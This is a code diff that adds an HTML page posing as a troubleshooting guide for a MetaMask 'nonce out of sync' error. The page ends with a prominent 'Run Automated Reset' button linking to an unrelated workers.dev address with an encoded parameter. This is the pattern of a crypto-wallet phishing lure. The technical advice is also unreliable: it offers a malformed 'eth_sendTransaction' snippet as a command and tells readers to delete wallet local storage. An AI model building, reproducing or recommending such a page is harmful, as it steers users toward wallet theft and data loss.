@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
+<style>
+    body {
+        font-family: sans-serif;
+        background: #0a0c10;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #cf6679; }
+    .btn {
+        background: #ff7b2c;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs when the nonce (a counter tracking the number of transactions sent from an address) stored in MetaMask does not match the nonce on the Ethereum blockchain, often due to pending or failed transactions.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Reset the MetaMask account to sync the local nonce with the blockchain:</li>
+<li>Delete the MetaMask local storage to reset account data</li>
+<li>Use the Ethereum blockchain explorer to verify the correct nonce</li>
+<li>Update the MetaMask nonce manually using the following command:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="o">{</span><span class="w"> </span>
+<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address&quot;</span>,<span class="w"> </span>
+<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...correct_nonce&quot;</span><span class="w"> </span>
+<span class="o">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external interface for more direct access to your Ethereum account. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Access to the Ethereum blockchain explorer (e.g., Etherscan)</li>
+<li>A basic understanding of Ethereum transactions and nonces</li>
+<li>The ability to use MetaMask and its settings</li>
+</ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=ZXRo" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
